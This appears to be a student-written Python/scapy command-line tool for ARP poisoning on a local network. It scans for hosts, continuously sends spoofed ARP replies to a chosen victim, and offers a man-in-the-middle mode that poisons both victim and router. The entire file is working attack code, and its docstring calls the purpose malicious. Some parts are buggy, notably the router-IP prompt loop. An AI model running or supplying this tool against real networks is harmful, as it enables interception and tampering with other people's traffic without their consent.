from scapy.all import *
#from scapy.all import Ether, ARP, get_if_addr, conf, sendp
import argparse
from time import sleep
import re # regex for ip validation
import sys
import traceback
import threading

"""
ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)

Steps to achieve ARP poisoning:
1. Choose victim machine on the same network
2. Get IP address of victim
3. Continuously send ARP packets (with arbitrary MAC-adress) using scapy to victim machine
4. Choosing the MAC-adress of the router will force the traffic, which usually goes from victim -> router, to flow from victim -> this machine

"""
# command line tool parser
parser = argparse.ArgumentParser(description="This program is an ARP poisoning tool")
args = parser.parse_args()

def print_banner():
    """
    Print some ASCII art for aesthetic purposes
    """
    banner="""
    _   ___ ___ ___ 
   /_\ | _ \ _ \ _ \\
  / _ \|   /  _/  _/
 /_/ \_\_|_\_| |_|  
                  By group 21  
    """
    print(banner)

if sys.version_info[0] >= 3:
    raw_input = input
elif sys.version_info[0] < 3:
    input = raw_input

class ARPP(object):
    def __init__(self):
        self.SELECTED_INTERFACE = None
        self.TASK_DICT = {"help":parser.print_help,\
            "scan local network for users":self.get_network_users_ARPSCAN,\
            "menu":self.print_menu,\
            "arp poison":self.ARP_poison,\
            "exit":sys.exit,\
            "select interface":self.select_interface,\
            "end ARP poisoning processes": self.end_ARP,\
            "ARP MITM":self.ARP_MITM}
        self.THREADED_TASKS = []
        self.EVENTS = []
    
    def _get_my_ip(self):
        my_ip = get_if_addr(self.SELECTED_INTERFACE) # this variable is a string
        return my_ip
    
    def _get_my_mac(self):
        while self.SELECTED_INTERFACE is None:
                self.select_interface()
        return get_if_hwaddr(self.SELECTED_INTERFACE)
            
    def _assure_interface_is_selected(self):
        while self.SELECTED_INTERFACE is None:
            self.select_interface()
    
    def _get_mac_from_ip(self, ip):
        self._assure_interface_is_selected()
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = broadcast / arp_request
        answ = srp(pkt, timeout=1, verbose=False, iface=self.SELECTED_INTERFACE)[0]
        return answ[0][1].hwsrc

    def _represents_int(self, i):
        try: 
            int(i)
        except ValueError:
            return False
        else:
            return True
    
    def _is_valid_ip(self, ip):
        try:
            return [0<=int(x)<256 for x in re.split('\.',re.match(r'^\d+\.\d+\.\d+\.\d+$',ip).group(0))].count(True)==4
        except:
            return False

    def print_menu(self):
        task_names = self.TASK_DICT.keys()
        for i, task_name in enumerate(task_names, start=0):
            print("{}: {}".format(i, task_name))


    def get_ip_range(self, ip_range=None):
        if ip_range is None:
            ip_range = self._get_my_ip()+"/24"
        return ip_range

    def select_interface(self):
        # code breaks for Windows here
        print("Which interface would you like to use:")
        iflist = get_if_list()
        for i, _ in enumerate(iflist, start=0):
            print("{}: {}".format(i,_))
        
        answer = None
        while answer is None:
            try:
                answer = str(input("select interface>>"))
            except:
                answer = None
            
        if self._represents_int(answer):
            answer = int(answer)
            if answer < len(iflist):
                self.SELECTED_INTERFACE=iflist[answer]
            else:
                print("Interface does not exist\n")
        elif answer in iflist:
            self.SELECTED_INTERFACE = answer
        else:
            print("Interface does not exist\n")
    
    def get_network_users_ARPSCAN(self):
        """
        ARP ping scan
        """
        self._assure_interface_is_selected()
        
        ip_range = self.get_ip_range()
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
        print("Scanning devices connected to network, please wait...")
        
        print("Selected Interface: {}".format(self.SELECTED_INTERFACE))
            
        network_devices = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
        for i, user in enumerate(network_devices, start=1):
            print("{}          {}".format(user[1].psrc, user[1].hwsrc))
        
        #print(network_devices)
        if network_devices == []:
            print("No network devices found\n")
        
    def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
        """
        Victim's arp table will contain the entry
        ----------
        ...
        ipToSpoof at macAttacker
        ...
        ----------

        Args:
            ipVictim (str): _description_
            ipToSpoof (str): _description_
        """
        self._assure_interface_is_selected()
        
        while not self._is_valid_ip(ipVictim):
            try:
                ipVictim = str(input("ip of victim>>"))
            except SyntaxError:
                pass
        
        print("The ip to spoof is the ip you want your mac address to be associated to in the victim's arp table")
        while not self._is_valid_ip(ipToSpoof):
            try:
                ipToSpoof = str(input("ip to spoof>>"))
            except SyntaxError:
                pass
        
        macVictim = self._get_mac_from_ip(ipVictim) # fix bug where error given if ip is not online on network
        macAttacker = self._get_my_mac()
                
        
        pkt = Ether() / ARP()
        pkt[Ether].src = macAttacker
        pkt[ARP].hwsrc = macAttacker
        pkt[ARP].psrc  = ipToSpoof
        pkt[ARP].hwdst = macVictim
        pkt[ARP].pdst  = ipVictim
        
        print("ARP spoofing started")
        e = threading.Event()
        def rec(event):
            while True:
                if event.isSet():
                    break
                sendp( pkt, iface=self.SELECTED_INTERFACE, verbose=False )
                sleep(5)
        
        T = threading.Thread(target=rec, name="Spoofing {} -> {}".format(ipToSpoof, ipVictim), args=(e,))
        
        self.THREADED_TASKS.append(T)
        self.EVENTS.append(e)
        self.THREADED_TASKS[-1].start()
    
    def ARP_MITM(self):
        ipVictim = ""
        ipRouter = ""
        while not self._is_valid_ip(ipVictim):
            try:
                ipVictim = str(input("ip of victim>>"))
            except SyntaxError:
                pass
        while not self._is_valid_ip(ipRouter):
            try:
                ipVictim = str(input("ip of router>>"))
            except SyntaxError:
                pass
        self.ARP_poison(ipVictim=ipVictim, ipToSpoof=ipRouter)
        self.ARP_poison(ipVictim=ipRouter, ipToSpoof=ipVictim)
        
        
    def end_ARP(self):
        print("From the following threads select the processes to terminate:")
        alive_tasks_names = {}
        for i,task in enumerate(self.THREADED_TASKS,start=0):
            alive_tasks_names[i] = task.getName()
            if task.isAlive():
                print("{}: {}".format(i, task.getName()))
        
        try:
            ttk_id = int(raw_input("Task to terminate>>"))
            # for task in self.THREADED_TASKS:
            #     if task.getName() == alive_tasks_names[ttk_id]:
            #         task.stop()
            #         task.stopped()
            #         task.join()
            self.EVENTS[ttk_id].set() # stops the thread
            del self.THREADED_TASKS[ttk_id] # remove thread from list of threads 
            del self.EVENTS[ttk_id] # remove the event corresponding to the thread also
        except:
            tb = traceback.format_exc()
            print(tb)
        
    def end_all_threads(self):
        for e in self.EVENTS:
            if not e.isSet():
                e.set()

    def parse_command(self, command):
        if command == "":
            pass
        elif self._represents_int(command):
            command = int(command)
            try:
                task_name = self.TASK_DICT.keys()[command]
                task = self.TASK_DICT[task_name]
                # if task == sys.exit:
                #     self.end_all_threads()
                task()
            except IndexError as e:
                print("Command not found\n")
                tb = traceback.format_exc()
                print(tb)
        else:
            try:
                task = self.TASK_DICT[command]
                task()
            except KeyError as e:
                print(e)
                #print("Command not found\n")
                
                tb = traceback.format_exc()
                print(tb)
                

    def CLI(self):
        try:
            command = raw_input(">>") #rawrawrawsputin
            command = str(command).lower()
            self.parse_command(command=command)
        except SyntaxError:
            pass

def main():
    cl = ARPP()
    print_banner()
    cl.print_menu()
    while True:
        cl.CLI()
    

if __name__=="__main__":
    main()